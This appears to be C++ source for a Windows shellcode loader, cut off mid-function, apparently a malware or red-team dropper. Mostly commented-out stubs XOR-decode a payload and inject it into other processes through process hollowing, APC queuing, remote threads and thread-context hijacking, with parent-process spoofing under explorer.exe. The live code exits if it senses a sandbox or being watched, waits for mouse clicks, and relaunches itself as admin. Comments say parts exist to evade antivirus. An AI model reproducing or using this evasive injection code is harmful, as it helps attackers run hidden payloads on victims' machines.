
#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <winnt.h>

#include <iostream>
#include <thread>

//get clicks and msgBox
#include <winuser.h>

#include "sourcefiles/settings/Settings.hpp"
#include "sourcefiles/syscalls/Syscalls_all.h"

#include "rsrc/resource.h"

//convert SID to String SID
#include <sddl.h>
//list processes
#include <tlhelp32.h>
//get module file name
#include <psapi.h>
//for find
#include <string.h>
//file ::filesystem::exists
#include <filesystem>
//StringCbPrintf()
#include "strsafe.h"

//#include "zip.h"

//convert to wstring I GUESS
//#include <codecvt>

#ifndef WINDOWS_NTSTATUS_H
#define WINDOWS_NTSTATUS_H

/**
* @author Roger Karlsson
* @since 2009-03-13
*/
#endif //WINDOWS_NTSTATUS_H

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef NT_ERROR
#define NT_ERROR(Status) ((ULONG)(Status) >> 30 == 3)
#endif


/*
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

//REPLACE_ME_PAYLOAD

//unsigned int payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    cid.UniqueProcess = processID;

    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);

    // Get a handle to the process.
    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (NULL == hProcess)
        return 1;

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;

                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }

            }
        }
    }

    // Release the handle to the process.
    NtClose(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;

    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;

    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}

int deC(unsigned char payload[])
{
    std::string key;
    key = "REPLACE_ME_KEY";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

//PROCESS FUNCTIONS
HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}
PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}

//STUBS FUNCTIONS
//process_hollow_stub
void process_hollow_stub() {
    getLoadedDlls();
    deC(payload);

    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return;

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);

    if (res != 0) {
        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0) {
        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
    }

    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0) {
        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
        std::cout << "nBytes: " << nBytes << std::endl;
        return;
    }
    else {
        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
    }

    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
    PVOID entrypointAddress = (PVOID)rvaconv2;

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = (SIZE_T)payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0) {
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtResumeThread(hThread, &tmp);
    if (res != 0) {
        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
}
//CurrentThread_stub
void CurrentThread_stub() {
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;

    getLoadedDlls();
    deC(payload);

    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0) {
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0) {
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0) {
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0) {
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return;
    }
    else {
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    res = NtWaitForSingleObject(thandle, -1, NULL);
}
//QueueUserAPC_stub
void QueueUserAPC_stub() {
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;

    getLoadedDlls();
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0) {
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0) {
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);

    if (res != 0) {
        std::cout << "NtQueueApcThread FAILED to add routine to APC queue: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtQueueApcThread added routine to APC queue successfully." << std::endl;
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0) {
        std::cout << "NtAlertResumeThread FAILED to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAlertResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
}
//RemoteThreadSuspended_stub
void RemoteThreadSuspended_stub() {
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten;

    getLoadedDlls();
    deC(payload);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "REPLACE_ME_PROCESS") == 0)
            {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                cid.UniqueThread = 0;
                cid.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (res != 0) {
                    std::cout << "NtOpenProcess FAILED to open the target process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtOpenProcess opened the target process sucessfully." << std::endl;
                }

                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (res != 0) {
                    std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
                }

                res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

                if (res != 0) {
                    std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
                }

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

                if (res != 0) {
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);

                if (res != 0) {
                    std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
                }

                std::cout << "Sleeping for 10 seconds to avoid in-memory AV scan..." << std::endl;
                Sleep(10000);

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

                if (res != 0) {
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtResumeThread(thandle, 0);

                if (res != 0) {
                    std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
                }

                NtClose(hProcess);
                NtClose(thandle);
            }
        }
    }

    NtClose(snapshot);
}
//RemoteThreadContext_stub
void RemoteThreadContext_stub() {
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;

    getLoadedDlls();
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;

    HANDLE hProcess = pi.hProcess;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0) {
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0) {
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0) {
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    void* _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
    if (_loadLibrary == NULL) {
        std::cout << "[X] Error: Could not find address of LoadLibrary" << std::endl;
        return 0;
    }

    HANDLE hThread;

    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0) {
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL;

    res = NtGetContextThread(hThread, &ctx);

    if (res != 0) {
        std::cout << "NtGetContextThread FAILED to get context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtGetContextThread got context of thread successfully." << std::endl;
    }

    ctx.Rip = (DWORD64)base_addr;

    res = NtSetContextThread(hThread, &ctx);

    if (res != 0) {
        std::cout << "NtSetContextThread FAILED to set context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtSetContextThread set context of thread successfully." << std::endl;
    }

    res = NtResumeThread(hThread, 0);

    if (res != 0) {
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
}

*/


int counterVar = 0;
int beingWatched = -1;
bool safe = false;

void counterTh() {
    for (int i=0; i<3600; i++) {
        if (safe) { return; }
        Sleep(1000);
    }
    //std::cout << "COUNTER THREAD: after an eturnity\n";
    counterVar++;
}

void watcherTh() {
    for (int i = 0; i < 10; i++) {
        Sleep(1000);
        //std::cout << "WATCHER THREAD: after 200ms  -- counter=" << counterVar << "\n";
        if (counterVar > 0) { beingWatched = 1; return; }
    }

    safe = true;
    beingWatched = 0;
}

void checker() {
    std::thread counter(counterTh);
    std::thread watcher(watcherTh);
    counter.join();
    watcher.join();

    //std::cout << "checking the boolean\n";
    if (beingWatched != 0) {exit(0);}

    //wait for 10 clicks
    int clickCounter = 0;
    while(clickCounter < 10){if(GetAsyncKeyState(VK_LBUTTON)){clickCounter++;}Sleep(100);}
}

BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

VOID executeExe(LPCSTR lpApplicationName, std::string commandLine)
{
    // additional information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // start the program up
    CreateProcessA(lpApplicationName,   // the path
        NULL,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        (LPSTARTUPINFOA)&si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    );
    //detach debuger
    DebugSetProcessKillOnExit(FALSE);
    //let taregt process run free
    DebugActiveProcessStop(pi.dwProcessId);
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

bool ntStatusCheck(NTSTATUS ntstatus, std::string errMsg) {
    
    if (ntstatus != 0) {
        std::cout << errMsg << "\n";

        if (ntstatus == 0xC0000003) {
            printf("err => : NT_STATUS_INVALID_INFO_CLASS\n");
        }
        else if (ntstatus == 0xC0000004) {
            printf("err => : NT_STATUS_INFO_LENGTH_MISMATCH\n");
        }
        else if (ntstatus == 0xC000000d) {
            printf("err => : NT_STATUS_INVALID_PARAMETER\n");
        }
        else if (ntstatus == 0xC0000022) {
            printf("err => : NT_STATUS_ACCESS_DENIED\n");
        }
        else if (ntstatus == 0xC0000002) {
            printf("err => : NT_STATUS_NOT_IMPLEMENTED incorrect function\n");
        }
        else if (ntstatus == 0xC0000001) {
            printf("err => : NT_STATUS_UNSUCCESSFUL 	A device attached to the system is not functioning.\n");
        }
        else if (ntstatus == 0xC000009d) {
            printf("err => : NT_STATUS_DEVICE_NOT_CONNECTED 	The device is not ready.\n");
        }else if (ntstatus == 0xc00000bb) {
            printf("err => : NT_STATUS_NOT_SUPPORTED\n");
        }
        else {
            std::string errmsg = "\n=> err code: %x\n";
            if (ntstatus != 0) { printf(errmsg.c_str(), ntstatus); }
        }

        return false;
    
    }

    
    return true;
}

void GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0) {
        std::cout << "no msg err\n"; //No error message has been recorded
        return;
    }

    LPSTR messageBuffer = nullptr;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    //Copy the error message into a std::string.
    std::string message(messageBuffer, size);

    //Free the Win32's string's buffer.
    LocalFree(messageBuffer);

    std::cout << message << "\n";
}

void askForPriv() {
    wchar_t szPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, szPath, ARRAYSIZE(szPath)))
    {
        // Launch itself as admin
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;
        if (!ShellExecuteExW(&sei))
        {
            DWORD dwError = GetLastError();
            if (dwError == ERROR_CANCELLED){/*failed*/}
            else{/*there is some error*/}
        }
        else{exit(0);}
    }
}

bool amIPrivleged() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    
    if (!hToken) {CloseHandle(hToken);}

    return fRet;
}

int isRegValueSet(std::wstring regPath, std::string agentName) {
    
    NTSTATUS status;

    ///////////OPENING THE KEY
    HANDLE hkey;
    ULONG dispos = 0;

    std::wstring wsPath = regPath;
    UNICODE_STRING nameW{};
    nameW.Length = (wsPath.size() * 2);
    nameW.MaximumLength = (wsPath.size() * 2);
    nameW.Buffer = wsPath.data();

    OBJECT_ATTRIBUTES attr;
    attr.Length = sizeof(attr);
    attr.RootDirectory = 0;
    attr.ObjectName = &nameW;
    attr.Attributes = 0;
    attr.SecurityDescriptor = NULL;
    attr.SecurityQualityOfService = NULL;

    status = NtOpenKey(&hkey, KEY_QUERY_VALUE | KEY_READ, &attr);
    if (!ntStatusCheck(status, "NtOpenKey Err")) { return -1; }


    if (dispos == REG_OPENED_EXISTING_KEY) {
        printf("already exists\n");
        return dispos; /* someone else already loaded the registry */
    }

    if (hkey == NULL) {
        printf("key handle is NULL\n");
    }

    ///////////SETTING VALUE KEY
    //value namer
    std::wstring wsAgentName = std::wstring(agentName.begin(), agentName.end());
    UNICODE_STRING valueNameUSTR{};
    valueNameUSTR.Length = (wsAgentName.size() * 2);
    valueNameUSTR.MaximumLength = (wsAgentName.size() * 2);
    valueNameUSTR.Buffer = wsAgentName.data();

    //value data
    KEY_VALUE_INFORMATION_CLASS basicInfo{};
    DWORD outSize;
    status = NtQueryValueKey(hkey, &valueNameUSTR, KeyValueBasicInformation, &basicInfo, sizeof(KEY_VALUE_INFORMATION_CLASS), &outSize);
    if (status == 0xc0000034) { return 0; } //exception error
    //if (!ntStatusCheck(status, "NtOpenKey Err")) { return -1; }
    NtClose(hkey);
    
    return 1;
}

std::wstring getUserSID() {
    NTSTATUS status = NULL;
    ///////////GETTING THE ACCESS TOKEN
    HANDLE hToken;
    ULONG LengthNeeded;

    //TODO: NTCurrentProcess
    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    
    LPWSTR WStringSid = NULL;//STRING SID
    if (ntStatusCheck(status, "NtOpenProcessToken Err")) {

        ///////////GETTING THE USER SID
        status = NtQueryInformationToken(hToken, TokenUser, NULL, 0, &LengthNeeded);
        if (status == 0xC0000023 || status == 0x0000007a) {//NT_STATUS_BUFFER_TOO_SMALL
            PTOKEN_USER pTIL = NULL;
            pTIL = (PTOKEN_USER)LocalAlloc(0, LengthNeeded);
            memset(pTIL, 0, LengthNeeded);

            if (pTIL) {
                status = NtQueryInformationToken(hToken, TokenUser, pTIL, LengthNeeded, &LengthNeeded);
                if (ntStatusCheck(status, "NtQueryInformationToken Err")) {

                    if (ConvertSidToStringSidW(pTIL->User.Sid, &WStringSid)) {
                        if (!IsValidSid(pTIL->User.Sid)) {return L"";}
                    }
